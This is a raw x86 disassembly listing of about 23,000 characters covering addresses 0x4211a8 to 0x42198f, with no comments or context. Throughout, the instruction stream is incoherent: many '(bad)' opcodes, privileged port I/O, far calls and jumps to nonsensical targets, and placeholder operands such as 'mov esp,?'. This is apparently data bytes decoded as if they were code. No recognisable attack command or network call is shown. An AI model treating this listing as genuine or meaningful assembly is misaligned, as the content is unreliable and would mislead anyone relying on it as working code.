  4211a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211a9:	add    dh,bl
  4211ab:	push   cs
  4211ac:	sub    BYTE PTR [ecx],cl
  4211ae:	pop    esi
  4211af:	jno    0x42121c
  4211b1:	sub    BYTE PTR [ecx-0x59],bl
  4211b4:	jns    0x4211ff
  4211b6:	adc    ah,BYTE PTR [eax-0x6e358d56]
  4211bc:	fcmovu st,st(1)
  4211be:	mov    ah,0xd2
  4211c0:	shl    ebp,0x86
  4211c3:	inc    esp
  4211c4:	scas   al,BYTE PTR es:[edi]
  4211c5:	int3   
  4211c6:	mov    ds:0x206c46e9,al
  4211cb:	or     BYTE PTR [ecx-0x20],ch
  4211ce:	jecxz  0x421155
  4211d0:	int3   
  4211d1:	ins    BYTE PTR es:[edi],dx
  4211d2:	and    BYTE PTR [ecx-0x9911cfe],bh
  4211d8:	fist   DWORD PTR ss:[ecx-0x20]
  4211dc:	adc    al,0xa3
  4211de:	scas   eax,DWORD PTR es:[edi]
  4211df:	add    esp,0x31
  4211e2:	adc    eax,0xc4b134d3
  4211e7:	push   esi
  4211e8:	adc    eax,0xd71762c0
  4211ed:	jecxz  0x421227
  4211ef:	sbb    ecx,edi
  4211f1:	mov    ecx,0xa3939c3
  4211f6:	mov    dh,0x9d
  4211f8:	imul   edi,ebp,0x14c04010
  4211fe:	adc    eax,0x10f4bd98
  421203:	jg     0x4211a0
  421205:	lahf   
  421206:	(bad)  
  421207:	and    eax,0xe62ae1a2
  42120c:	nop
  42120d:	popa   
  42120e:	mov    ecx,0x7c7f4f76
  421213:	mov    edx,0xa73af69d
  421218:	mov    esp,eax
  42121a:	je     0x4211aa
  42121c:	adc    BYTE PTR [edx],dh
  42121e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42121f:	popf   
  421220:	pop    ebx
  421221:	fbstp  TBYTE PTR [ebx]
  421223:	xor    BYTE PTR [eax-0x6c4ac780],dh
  421229:	out    0xbe,al
  42122b:	jge    0x421286
  42122d:	fimul  DWORD PTR [ecx+0xb36b4a6]
  421233:	call   0x1291:0x8cd943f9
  42123a:	jle    0x421262
  42123c:	sbb    bh,ch
  42123e:	loope  0x421247
  421240:	mov    edi,0x154dd6f5
  421245:	add    bl,BYTE PTR [esi+0x71e1b95c]
  42124b:	pop    ebp
  42124c:	inc    ebx
  42124d:	push   ds
  42124e:	(bad)  
  42124f:	frstor [edi+0x18]
  421252:	mov    ds:0x6990d843,al
  421257:	jle    0x42122f
  421259:	and    DWORD PTR [eax-0x4f],edx
  42125c:	cmp    edi,esi
  42125e:	xchg   esi,eax
  42125f:	sar    BYTE PTR [edx+0x2eab850f],cl
  421265:	sub    DWORD PTR [edi-0x3e],eax
  421268:	loope  0x4212d3
  42126a:	adc    DWORD PTR [esi+0x4c547584],0xffffffcd
  421271:	xchg   ebp,eax
  421272:	jg     0x4212e1
  421274:	aad    0xc6
  421276:	imul   ebx,DWORD PTR [ebx+0x49],0x4958b1c4
  42127d:	cmp    BYTE PTR [esi-0x54b76932],al
  421283:	addr16 addr16 add ebp,esi
  421287:	aas    
  421288:	inc    ecx
  421289:	das    
  42128a:	push   ss
  42128b:	jmp    0xb0e54ade
  421290:	js     0x421288
  421292:	out    0xca,al
  421294:	iret   
  421295:	popf   
  421296:	pop    eax
  421297:	retw   
  421299:	cld    
  42129a:	xor    ecx,0xfffffffb
  42129d:	popa   
  42129e:	ret    
  42129f:	cld    
  4212a0:	call   DWORD PTR [edx+0x3e7f0b39]
  4212a6:	pusha  
  4212a7:	jne    0x421305
  4212a9:	push   0x6f50b27c
  4212ae:	sbb    eax,DWORD PTR ds:0x49ab57da
  4212b4:	or     eax,0xc642e49c
  4212b9:	(bad)  
  4212ba:	mov    ds:0x45b0d6e3,al
  4212bf:	les    esp,FWORD PTR [ebp-0x5d]
  4212c2:	adc    eax,edi
  4212c4:	test   al,0xdb
  4212c6:	adc    BYTE PTR [esi-0x5e],ch
  4212c9:	scas   eax,DWORD PTR es:[edi]
  4212ca:	daa    
  4212cb:	push   ecx
  4212cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212cd:	int3   
  4212ce:	xlat   BYTE PTR ds:[ebx]
  4212cf:	ins    DWORD PTR es:[edi],dx
  4212d0:	inc    eax
  4212d1:	push   ecx
  4212d2:	push   ecx
  4212d3:	mov    edi,0xa3e4d93a
  4212d8:	(bad)  
  4212d9:	cmp    edx,DWORD PTR [edi+0x6a]
  4212dc:	mov    WORD PTR [eax],ss
  4212de:	ins    DWORD PTR es:[edi],dx
  4212df:	leave  
  4212e0:	xor    al,0xc5
  4212e2:	sbb    eax,0x7e9260f5
  4212e7:	or     eax,0x40c0a8f9
  4212ec:	ss inc esi
  4212ee:	fnstcw WORD PTR [ebx-0x7b]
  4212f1:	arpl   dx,cx
  4212f3:	fs aas 
  4212f5:	sbb    eax,0x87092843
  4212fa:	cmp    eax,0x13873324
  4212ff:	pop    ss
  421300:	mov    ah,BYTE PTR [ecx+0x1]
  421303:	test   BYTE PTR [edx],ah
  421305:	fmul   DWORD PTR [edi]
  421307:	lods   al,BYTE PTR ds:[esi]
  421308:	(bad)
  42130c:	lea    ecx,[ebx]
  42130e:	cmc    
  42130f:	int3   
  421310:	loop   0x421306
  421312:	cdq    
  421313:	fld    DWORD PTR [eax+0x691a23ee]
  421319:	pop    ebp
  42131a:	push   ebp
  42131b:	mov    bl,BYTE PTR [esi]
  42131d:	fadd   st(1),st
  42131f:	sbb    eax,0x76fbacb2
  421324:	aas    
  421325:	sub    eax,0x3b64a88
  42132a:	pop    edx
  42132b:	push   0x97cf4c2a
  421330:	mov    ebx,0xdbd2920b
  421335:	cmc    
  421336:	enter  0x1249,0xe7
  42133a:	mov    ds:0x96cb428a,eax
  42133f:	rcr    BYTE PTR [ecx+0x78df619e],1
  421345:	out    0x97,eax
  421347:	(bad)  
  421349:	xchg   cl,cl
  42134b:	ss ret 
  42134d:	jle    0x4213bd
  42134f:	jbe    0x421312
  421351:	adc    al,0x47
  421353:	ror    BYTE PTR [ecx+0x42],1
  421356:	cmp    BYTE PTR [ecx+ebx*2-0x534fb82a],0xd0
  42135e:	es dec ebx
  421360:	mov    dh,0xbf
  421362:	ja     0x4212fb
  421364:	add    eax,0x24c39ef0
  421369:	outs   dx,DWORD PTR ds:[esi]
  42136a:	fild   WORD PTR [ebx+0x511f8368]
  421370:	mov    ebp,0x878c6618
  421375:	mov    ds:0x34dd5902,eax
  42137a:	push   0xffffffd6
  42137c:	mov    al,ds:0x77965d85
  421381:	dec    edx
  421382:	(bad)  
  421383:	jmp    0x42134b
  421385:	inc    ebp
  421386:	in     eax,dx
  421387:	jae    0x42134b
  421389:	mov    al,BYTE PTR [esi-0x15]
  42138c:	add    cl,dh
  42138e:	lods   eax,DWORD PTR ds:[esi]
  421390:	int    0x2a
  421392:	fnsave [edx-0x25]
  421395:	jb     0x421385
  421397:	scas   eax,DWORD PTR es:[edi]
  421398:	rol    DWORD PTR [ebx],1
  42139a:	cs xchg ebx,eax
  42139c:	mov    bh,0x87
  42139e:	loope  0x421337
  4213a0:	je     0x42141f
  4213a2:	inc    edx
  4213a3:	and    ecx,edi
  4213a5:	imul   BYTE PTR [eax+0x22eec423]
  4213ab:	pavgb  mm4,mm2
  4213ae:	ja     0x4213d5
  4213b0:	mov    ecx,0x881da878
  4213b5:	mul    BYTE PTR [ecx]
  4213b7:	dec    esp
  4213b8:	fisttp QWORD PTR [ecx+edx*4-0x42]
  4213bc:	ja     0x421388
  4213be:	and    BYTE PTR [esi],bh
  4213c0:	dec    eax
  4213c1:	mov    ebp,0x5542c83f
  4213c6:	sbb    al,BYTE PTR [ecx-0x570e37af]
  4213cc:	dec    edx
  4213cd:	xchg   ebp,eax
  4213ce:	dec    ecx
  4213cf:	out    dx,eax
  4213d0:	mov    esp,0x2f578f59
  4213d5:	or     edi,DWORD PTR [ecx+ebx*1]
  4213d8:	sub    al,0xeb
  4213da:	jg     0x421388
  4213dc:	outs   dx,BYTE PTR ds:[esi]
  4213dd:	mov    cl,0xcc
  4213df:	icebp  
  4213e0:	leave  
  4213e1:	pusha  
  4213e2:	mul    bh
  4213e4:	lahf   
  4213e5:	and    BYTE PTR [esi+ecx*1],ah
  4213e8:	add    dh,BYTE PTR [esi-0x33da9876]
  4213ee:	aaa    
  4213ef:	scas   eax,DWORD PTR es:[edi]
  4213f0:	push   esp
  4213f1:	mov    ds:0x129ce59c,eax
  4213f6:	test   eax,0xf52f1b12
  4213fb:	adc    DWORD PTR [esi],ebx
  4213fd:	clc    
  4213fe:	pop    ebx
  4213ff:	mul    BYTE PTR [ebx+ecx*2]
  421402:	mov    WORD PTR [eiz*2+0x31bc0aa],ss
  421409:	inc    edi
  42140a:	push   es
  42140b:	fistp  WORD PTR [edx+ebx*2]
  42140e:	pop    ecx
  42140f:	fsub   QWORD PTR [ebp+0x619f1cfe]
  421415:	jg     0x421403
  421417:	sahf   
  421418:	jnp    0x42140e
  42141a:	cwde   
  42141b:	xchg   BYTE PTR ds:[eax],dl
  42141e:	mov    edi,0x6a208029
  421423:	add    al,0xb2
  421425:	xor    BYTE PTR [ecx+0x354f7869],bl
  42142b:	and    ecx,ebx
  42142d:	jp     0x4213c6
  42142f:	dec    eax
  421430:	sahf   
  421431:	pop    ecx
  421432:	pop    es
  421433:	push   esp
  421434:	cld    
  421435:	cld    
  421436:	xor    bh,BYTE PTR [ebp+ecx*8+0x60]
  42143a:	sub    al,0xee
  42143c:	in     eax,0x9c
  42143e:	mov    eax,0x4a573d6c
  421443:	sub    al,0x5a
  421445:	aaa    
  421446:	in     eax,0xdf
  421448:	xchg   esp,eax
  421449:	mov    ah,0x92
  42144b:	popf   
  42144c:	test   BYTE PTR [ebx+0xe],ch
  42144f:	sbb    edi,edx
  421451:	jne    0x421426
  421453:	and    al,BYTE PTR [esp+ecx*4+0x55a91de8]
  42145a:	push   edx
  42145b:	push   eax
  42145c:	push   esi
  42145d:	jmp    0xb8b1dc36
  421462:	pop    ebp
  421463:	daa    
  421464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421465:	lods   al,BYTE PTR ds:[esi]
  421466:	and    eax,DWORD PTR [ecx-0x2c354c89]
  42146c:	mov    eax,0x7b0f5fa3
  421471:	push   ebx
  421472:	test   DWORD PTR [esi],0x3e9d797f
  421478:	xor    eax,0x18deb920
  42147d:	push   0x76489069
  421482:	adc    al,0x8b
  421484:	pop    eax
  421485:	jmp    0xf8a9c46f
  42148a:	test   BYTE PTR ds:0xbb2d3cc1,al
  421490:	out    0x4c,eax
  421492:	pop    eax
  421493:	sbb    eax,eax
  421495:	push   edi
  421496:	aaa    
  421497:	test   eax,0x43939f1b
  42149c:	pop    esi
  42149d:	adc    DWORD PTR [edi],0x4a00a281
  4214a3:	hlt    
  4214a4:	and    eax,0xb4801f14
  4214a9:	push   ds
  4214aa:	inc    eax
  4214ab:	lahf   
  4214ac:	xchg   esp,eax
  4214ad:	jae    0x421471
  4214af:	dec    eax
  4214b0:	push   edi
  4214b1:	repz and ebp,ebx
  4214b4:	push   edx
  4214b5:	and    BYTE PTR [ebx],ah
  4214b7:	push   ds
  4214b8:	push   ebx
  4214b9:	add    BYTE PTR [ebx],bl
  4214bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214bc:	jmp    0xfdfd45ae
  4214c1:	in     al,dx
  4214c2:	or     DWORD PTR ds:0x5f7bbaf3,ecx
  4214c8:	jae    0x421450
  4214ca:	lds    ecx,FWORD PTR [eax-0x31]
  4214cd:	repnz push edi
  4214cf:	jb     0x421515
  4214d1:	inc    esp
  4214d2:	in     eax,0x3e
  4214d4:	mov    esi,0x53e5c68c
  4214d9:	sub    eax,0x676f45f2
  4214de:	test   BYTE PTR [eax-0x131d986c],0x2e
  4214e5:	jae    0x4214c8
  4214e7:	or     eax,0x1608cb6
  4214ec:	jns    0x42153f
  4214ee:	(bad)  
  4214ef:	sahf   
  4214f0:	xchg   BYTE PTR [eax],dh
  4214f2:	popf   
  4214f3:	imul   edx,DWORD PTR [edx+0x2d],0xffffffb5
  4214f7:	cwde   
  4214f8:	fistp  DWORD PTR fs:[eax-0x1617e73d]
  4214ff:	push   cs
  421500:	out    0x21,eax
  421502:	pop    ecx
  421503:	add    eax,0x71acbad4
  421508:	scas   eax,DWORD PTR es:[edi]
  421509:	test   ebx,esp
  42150b:	test   edi,0x3fbf7ec3
  421511:	push   0xffffff99
  421513:	inc    ebp
  421514:	adc    dh,BYTE PTR [edx+0x1920667b]
  42151a:	or     al,0xfd
  42151c:	fsubr  QWORD PTR ds:0x54a4a987
  421522:	scas   eax,DWORD PTR es:[edi]
  421523:	mov    ch,0x32
  421525:	and    eax,0x79c5cbf5
  42152a:	pushf  
  42152b:	js     0x42150d
  42152d:	retf   0xbbf9
  421530:	jns    0x4214f8
  421532:	mov    edx,0x1dda9026
  421537:	xor    DWORD PTR [edx-0x25],ebp
  42153a:	(bad)  
  42153b:	js     0x421561
  42153d:	loopne 0x4215b4
  42153f:	push   eax
  421540:	xor    dl,bh
  421542:	jmp    0xa411:0xcacbf8ea
  421549:	mov    bl,0x1e
  42154b:	add    edi,DWORD PTR [ebx]
  42154d:	jbe    0x4214fe
  42154f:	stc    
  421550:	sub    esi,ebx
  421552:	xor    edi,DWORD PTR [edi+0x54]
  421555:	sub    dl,bh
  421557:	fst    DWORD PTR [edx+0x4b]
  42155a:	mov    eax,0x3e69c4f8
  42155f:	shl    bl,cl
  421561:	aam    0x3e
  421563:	push   ecx
  421564:	add    eax,0xbd0ce9e6
  421569:	mov    WORD PTR [edi+0x5a],ss
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0x4496fab5
  421579:	dec    ecx
  42157a:	and    BYTE PTR [ecx+eax*1+0x68800],0x0
  421582:	out    dx,eax
  421583:	jp     0x4215e1
  421585:	mov    esp,?
  421587:	clc    
  421588:	push   edi
  421589:	in     al,dx
  42158a:	sar    DWORD PTR [ecx],1
  42158c:	push   ebx
  42158d:	mov    ebp,0x97c331d0
  421592:	in     eax,0xb4
  421594:	(bad)  
  421595:	call   0xbf5c67e6
  42159a:	pusha  
  42159b:	xchg   edi,ebp
  42159d:	ins    DWORD PTR es:[edi],dx
  42159e:	aad    0xea
  4215a0:	test   eax,0x56d3b0e8
  4215a5:	xor    eax,0x403231e3
  4215aa:	pop    ebp
  4215ab:	enter  0xf172,0x59
  4215af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215b0:	and    esi,ebx
  4215b2:	ins    BYTE PTR es:[edi],dx
  4215b3:	mov    eax,ds:0x9c983602
  4215b8:	lahf   
  4215b9:	pop    eax
  4215ba:	adc    esi,DWORD PTR [esi]
  4215bc:	inc    ebp
  4215bd:	inc    eax
  4215be:	xchg   ebp,eax
  4215bf:	inc    eax
  4215c0:	test   BYTE PTR [ecx],dh
  4215c2:	mov    ebx,?
  4215c4:	adc    esi,DWORD PTR [ebx+ebx*2]
  4215c7:	aad    0xd7
  4215c9:	(bad)  
  4215ca:	push   es
  4215cb:	lahf   
  4215cc:	pop    es
  4215cd:	mov    eax,DWORD PTR [ecx]
  4215cf:	cmp    eax,0x4343aa9b
  4215d4:	cwde   
  4215d5:	mov    ah,0xa3
  4215d7:	in     al,dx
  4215d8:	es pop esp
  4215da:	out    0x5d,eax
  4215dc:	dec    ebx
  4215dd:	fcomp  QWORD PTR [ebp-0x4254ab17]
  4215e3:	jl     0x4215ff
  4215e5:	ror    DWORD PTR [ebp-0x78],0x56
  4215e9:	pop    es
  4215ea:	jmp    0x4e5b2f30
  4215ef:	xchg   esp,eax
  4215f0:	fimul  DWORD PTR [eax]
  4215f2:	inc    ebp
  4215f3:	arpl   WORD PTR [esi-0x39],dx
  4215f6:	adc    bl,cl
  4215f8:	cli    
  4215f9:	cli    
  4215fa:	inc    eax
  4215fb:	push   ebp
  4215fc:	int    0x99
  4215fe:	jns    0x4215a6
  421600:	(bad)  
  421601:	pop    eax
  421602:	jo     0x4215e6
  421604:	enter  0xa001,0xb6
  421608:	dec    esp
  421609:	jno    0x421656
  42160b:	aas    
  42160c:	mov    cl,BYTE PTR [eax-0xce66321]
  421612:	inc    ebp
  421613:	dec    esi
  421614:	mov    bl,0x37
  421616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421618:	sti    
  421619:	sub    bl,BYTE PTR [ecx+ebx*2+0x6e]
  42161d:	shr    DWORD PTR [ebx],0x7a
  421620:	int3   
  421621:	dec    ecx
  421622:	or     BYTE PTR [ecx],bh
  421624:	aaa    
  421625:	push   es
  421626:	xor    BYTE PTR [eax],ah
  421628:	mov    ds:0xc4e29991,eax
  42162d:	pop    es
  42162e:	fs add eax,0x3471e9a5
  421634:	fiadd  WORD PTR [edx+0x4d897edd]
  42163a:	nop
  42163b:	(bad)  
  42163c:	rcr    DWORD PTR [ebp+0x37],0x96
  421640:	push   eax
  421641:	repnz clc 
  421643:	sbb    edi,ebx
  421645:	dec    ecx
  421646:	loope  0x421691
  421648:	mov    ecx,DWORD PTR [esi+0x16c9f0fd]
  42164e:	(bad)  
  42164f:	jg     0x42160b
  421651:	nop
  421652:	cmp    eax,0xb49468d0
  421657:	sub    BYTE PTR [edx+0x33],ch
  42165a:	adc    bh,BYTE PTR [ebx-0x80]
  42165d:	ins    BYTE PTR es:[edi],dx
  42165e:	je     0x421642
  421660:	lahf   
  421661:	dec    ebp
  421662:	out    0x8,al
  421664:	mov    dl,0x3c
  421666:	add    DWORD PTR [ebp-0xfdf7cc1],edx
  42166c:	out    dx,al
  42166d:	ja     0x421625
  42166f:	inc    edi
  421670:	dec    edx
  421671:	mov    dl,0x8f
  421673:	out    0xef,eax
  421675:	into   
  421676:	cmp    ecx,DWORD PTR [ecx+0x47a0256e]
  42167c:	mov    DWORD PTR [esi-0x6f],esp
  42167f:	popf   
  421680:	mov    bh,0x4f
  421682:	push   ebp
  421683:	jp     0x4216d8
  421685:	ret    0xa57e
  421688:	cmc    
  421689:	pop    edx
  42168a:	das    
  42168b:	xchg   ebx,eax
  42168c:	jmp    0x3dfd:0xf0acf7a9
  421693:	sar    DWORD PTR [edi+0x1c07e40a],1
  421699:	xchg   ebp,eax
  42169a:	push   eax
  42169b:	js     0x4216e6
  42169d:	mov    al,0xf6
  42169f:	icebp  
  4216a0:	jnp    0x421673
  4216a2:	adc    BYTE PTR [esi],bl
  4216a4:	sub    ah,BYTE PTR [eax+eiz*8-0x30776331]
  4216ab:	sub    bl,dh
  4216ad:	fiadd  DWORD PTR [esi-0x5a544212]
  4216b3:	in     al,0x8b
  4216b5:	mov    dh,BYTE PTR [edx-0x6d]
  4216b8:	adc    eax,0xd8852619
  4216bd:	mov    dl,0x82
  4216bf:	loope  0x42167f
  4216c1:	daa    
  4216c2:	xchg   DWORD PTR [esi+eiz*2],edx
  4216c5:	aaa    
  4216c6:	xor    al,0xa0
  4216c8:	sti    
  4216c9:	lea    esp,[ecx-0x70917dd8]
  4216cf:	jecxz  0x42169d
  4216d1:	(bad)  
  4216d2:	fbld   TBYTE PTR [eax+0x36]
  4216d5:	(bad)  
  4216d6:	dec    ebx
  4216d7:	(bad)  ds:0xe75f17af
  4216dd:	ret    
  4216de:	push   es
  4216df:	or     DWORD PTR [ebp-0x3c],ebp
  4216e2:	xor    al,0x6e
  4216e4:	and    ebp,0x1a
  4216e7:	(bad)  
  4216e8:	outs   dx,DWORD PTR ds:[esi]
  4216e9:	mov    ebx,0x250f9f4
  4216ee:	fnstsw WORD PTR [edx+0x131a5082]
  4216f4:	mov    al,ds:0xa39a492a
  4216f9:	sbb    eax,0xe88a1308
  4216fe:	dec    esp
  4216ff:	adc    eax,0x4921031a
  421704:	mov    ds:0xe9ea54,eax
  421709:	push   ecx
  42170a:	lock call 0x1e041796
  421710:	sahf   
  421711:	sub    cl,bl
  421713:	loop   0x421778
  421715:	cwde   
  421716:	arpl   WORD PTR fs:[ecx],di
  421719:	fild   QWORD PTR [ecx]
  42171b:	xchg   edi,eax
  42171c:	jmp    DWORD PTR [ebp+0x78]
  42171f:	push   eax
  421720:	rcr    BYTE PTR [eax],cl
  421722:	loope  0x4216e4
  421724:	jp     0x421716
  421726:	inc    esi
  421727:	push   esi
  421728:	pop    esi
  421729:	cmp    DWORD PTR [ecx],ecx
  42172b:	gs mov dh,dh
  42172e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42172f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421730:	aas    
  421731:	fmul   st,st(5)
  421733:	sub    al,0x33
  421735:	pop    ss
  421736:	repnz test al,0x2f
  421739:	and    al,0xdc
  42173b:	push   edi
  42173c:	push   esp
  42173d:	adc    DWORD PTR [esi+0x839779e],edx
  421743:	icebp  
  421744:	add    DWORD PTR [ebx],0x2a1b41b9
  42174a:	push   es
  42174b:	push   ds
  42174c:	jg     0x421779
  42174e:	nop
  42174f:	dec    ebx
  421750:	add    bh,BYTE PTR [esi+0xe1ffb8]
  421756:	push   edx
  421757:	mov    BYTE PTR [esi-0x7a],bh
  42175a:	sbb    BYTE PTR [edi-0x74],al
  42175d:	in     eax,dx
  42175e:	stc    
  42175f:	sub    eax,0x75e8ae57
  421764:	sahf   
  421765:	push   eax
  421766:	sub    al,0x24
  421768:	adc    al,0x77
  42176a:	push   eax
  42176b:	mov    bl,0x87
  42176d:	int3   
  42176e:	fmul   DWORD PTR [ebp+0xd51ba18]
  421774:	inc    ecx
  421775:	xchg   al,bl
  421777:	repz pop eax
  421779:	dec    ebx
  42177a:	lods   eax,DWORD PTR ds:[esi]
  42177b:	pop    edi
  42177c:	dec    eax
  42177d:	clc    
  42177e:	hlt    
  42177f:	and    dl,dl
  421781:	sbb    eax,DWORD PTR [esi+0x3fb7c8b5]
  421787:	mov    ebp,edx
  421789:	pushf  
  42178a:	lea    esi,[esi+0x70dbf4da]
  421790:	adc    edx,esi
  421792:	xchg   esi,eax
  421793:	test   eax,0x4bb7b1b6
  421798:	int3   
  421799:	push   ds
  42179a:	popa   
  42179b:	pop    ebx
  42179c:	sub    al,0x44
  42179e:	push   ds
  42179f:	xchg   DWORD PTR [edx+0x4e55d020],ebp
  4217a5:	fldcw  WORD PTR [eax-0x7f]
  4217a8:	cld    
  4217a9:	jle    0x421798
  4217ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217ac:	mov    edx,0x1e2063b2
  4217b1:	jmp    0x421808
  4217b3:	out    dx,eax
  4217b4:	nop
  4217b5:	fs jns 0x42179c
  4217b8:	aas    
  4217b9:	popa   
  4217ba:	pop    esi
  4217bb:	sar    BYTE PTR [eax-0x204807e2],0x5d
  4217c2:	sub    BYTE PTR gs:[esi],al
  4217c5:	xchg   esp,eax
  4217c6:	dec    ecx
  4217c7:	pop    edi
  4217c8:	push   es
  4217c9:	dec    ebx
  4217ca:	jns    0x42178e
  4217cc:	mov    DWORD PTR [edi-0x7e],ebp
  4217cf:	ret    
  4217d0:	jo     0x4217c8
  4217d2:	lds    eax,FWORD PTR [eax]
  4217d4:	mov    esi,0x9d34f1c2
  4217d9:	scas   al,BYTE PTR es:[edi]
  4217da:	retf   0x794b
  4217dd:	adc    cl,bh
  4217df:	outs   dx,BYTE PTR ds:[esi]
  4217e0:	pop    ebx
  4217e1:	shl    DWORD PTR [ebp+0x16],0x8
  4217e5:	mov    ds:0x737a75d8,al
  4217ea:	xor    DWORD PTR [edx],edx
  4217ec:	cmp    edi,edx
  4217ee:	cmp    esp,ebx
  4217f0:	jno    0x421870
  4217f2:	pop    eax
  4217f3:	or     eax,0x4605676c
  4217f8:	inc    edi
  4217f9:	nop
  4217fa:	ffree  st(6)
  4217fc:	push   ecx
  4217fd:	adc    al,0xf8
  4217ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421800:	fwait
  421801:	add    BYTE PTR [ebp+0x9d712eb],bl
  421807:	addr16 hlt 
  421809:	loopne 0x4217a9
  42180b:	jbe    0x4217d9
  42180d:	scas   al,BYTE PTR es:[edi]
  42180e:	pop    ecx
  42180f:	loope  0x421813
  421811:	popf   
  421812:	(bad)  
  421813:	mov    dh,0x6
  421815:	enter  0x8de2,0xb6
  421819:	addr16 jmp 0xbc6ea4cc
  42181f:	je     0x421859
  421821:	imul   esi,DWORD PTR [edx-0x3e],0xe
  421825:	push   ss
  421826:	mov    ds:0x61a1c010,eax
  42182b:	sbb    dl,BYTE PTR ds:0x1510af02
  421831:	rcr    BYTE PTR [edi],1
  421833:	adc    bl,BYTE PTR [eax-0xcf19702]
  421839:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42183a:	sub    al,0x38
  42183c:	dec    edx
  42183d:	(bad)  
  421841:	sub    DWORD PTR [ebx-0x79332959],0x76
  421848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421849:	loopne 0x4217e9
  42184b:	sub    eax,0x1b791ac2
  421850:	fmul   DWORD PTR [eax-0x7f]
  421853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421854:	pusha  
  421855:	mov    bh,0xc4
  421857:	ins    DWORD PTR es:[edi],dx
  421858:	arpl   WORD PTR [ebx],bx
  42185a:	pop    esp
  42185b:	sbb    eax,0xc4ced087
  421860:	jp     0x4217f2
  421862:	fild   QWORD PTR [ecx-0x1]
  421865:	fistp  QWORD PTR [edx-0x5b33856a]
  42186b:	xor    BYTE PTR [ebx-0x61affca1],dh
  421871:	fidivr WORD PTR ds:0x80451a6a
  421877:	nop
  421878:	sbb    ecx,0x8f262f64
  42187e:	sub    esi,DWORD PTR [eax]
  421880:	xor    DWORD PTR [ebp-0x73],ecx
  421883:	sbb    dh,dh
  421885:	imul   DWORD PTR [esi+0x3b]
  421888:	xor    esi,edx
  42188a:	cmp    ebp,eax
  42188c:	lea    eax,[edi+eax*4+0x2f60985f]
  421893:	stc    
  421894:	jo     0x4218d7
  421896:	pop    edx
  421897:	stc    
  421898:	mov    eax,fs
  42189a:	mov    esi,0xe8468a7d
  42189f:	add    eax,0x659f2b7
  4218a4:	(bad)  
  4218a5:	or     al,BYTE PTR [edx-0x3c]
  4218a8:	ins    DWORD PTR es:[edi],dx
  4218a9:	bnd ja 0x421834
  4218ac:	or     al,0xa
  4218ae:	dec    eax
  4218af:	or     ecx,DWORD PTR ds:0x64b70283
  4218b5:	dec    esp
  4218b6:	call   0x5fd2107d
  4218bb:	test   BYTE PTR [edi],dl
  4218bd:	sub    dh,BYTE PTR [eax-0x38]
  4218c0:	pop    ecx
  4218c1:	mov    ah,0xd5
  4218c3:	sbb    eax,DWORD PTR [ebx]
  4218c5:	adc    edx,ebx
  4218c7:	cmp    DWORD PTR [esi+ecx*8],ecx
  4218ca:	ret    0x80c1
  4218cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218ce:	adc    ch,BYTE PTR ds:0x97782e06
  4218d4:	fcomp  QWORD PTR [ebx]
  4218d6:	jge    0x42187d
  4218d8:	push   ebp
  4218d9:	inc    esp
  4218da:	mov    ds:0x6b484f78,eax
  4218df:	dec    ch
  4218e1:	cs fdivp st(4),st
  4218e4:	jae    0x421964
  4218e6:	fsub   st(6),st
  4218e8:	jae    0x4218d7
  4218ea:	jmp    0x4218dd
  4218ec:	mov    BYTE PTR [esi+ebp*2-0x237eada7],dh
  4218f3:	pop    ss
  4218f4:	sbb    ebx,DWORD PTR [edx+eax*4+0x275b7775]
  4218fb:	call   0x27a:0x289abe16
  421902:	xchg   ebx,eax
  421903:	sub    dl,0x8f
  421906:	mov    ah,0x72
  421908:	mov    dh,0x9e
  42190a:	xchg   ebp,eax
  42190b:	ret    
  42190c:	push   ss
  42190d:	cmp    DWORD PTR [edi],esp
  42190f:	dec    esi
  421910:	bound  ebx,QWORD PTR gs:[edi]
  421913:	out    dx,al
  421914:	rcl    DWORD PTR [eax-0x6e],cl
  421917:	add    BYTE PTR [ebp-0x6096d2cf],dh
  42191d:	stc    
  42191e:	leave  
  42191f:	scas   al,BYTE PTR es:[edi]
  421920:	push   es
  421921:	cmp    eax,edi
  421923:	ins    DWORD PTR es:[edi],dx
  421924:	add    eax,0x453eb264
  421929:	test   edx,edx
  42192b:	pop    ds
  42192c:	jno    0x4218dc
  42192e:	lock paddsw mm4,QWORD PTR [esi-0x3c]
  421933:	push   cs
  421934:	out    0xf7,al
  421936:	lds    edi,FWORD PTR [eax+edx*4+0x1acbcbf7]
  42193d:	inc    eax
  42193e:	je     0x42197f
  421940:	pushf  
  421941:	into   
  421942:	cmc    
  421943:	mov    esi,0x5ac48b0f
  421948:	lock lds ecx,FWORD PTR [edx+edi*2+0x4c141459]
  421950:	shl    DWORD PTR [ebx+0x3c5af052],cl
  421956:	sbb    BYTE PTR [ecx-0x11],0xf5
  42195a:	xlat   BYTE PTR ds:[ebx]
  42195b:	pop    ecx
  42195c:	arpl   WORD PTR [edx-0x722ef2e5],di
  421962:	in     al,dx
  421963:	jnp    0x421914
  421965:	test   BYTE PTR [ecx],0xfc
  421968:	add    eax,0xa64da8ac
  42196d:	and    DWORD PTR [edi-0x8],esp
  421970:	mov    DWORD PTR [ebx+0x35],esi
  421973:	jae    0x421995
  421975:	push   ebx
  421976:	test   eax,0x43caec8
  42197b:	enter  0x7a22,0x31
  42197f:	leave  
  421980:	sbb    al,0xbb
  421982:	out    dx,al
  421983:	cmc    
  421984:	pop    ss
  421985:	out    dx,eax
  421986:	mov    edi,0xe82818ac
  42198b:	jae    0x4219e7
  42198d:	and    bl,ah
  42198f:	cmc    
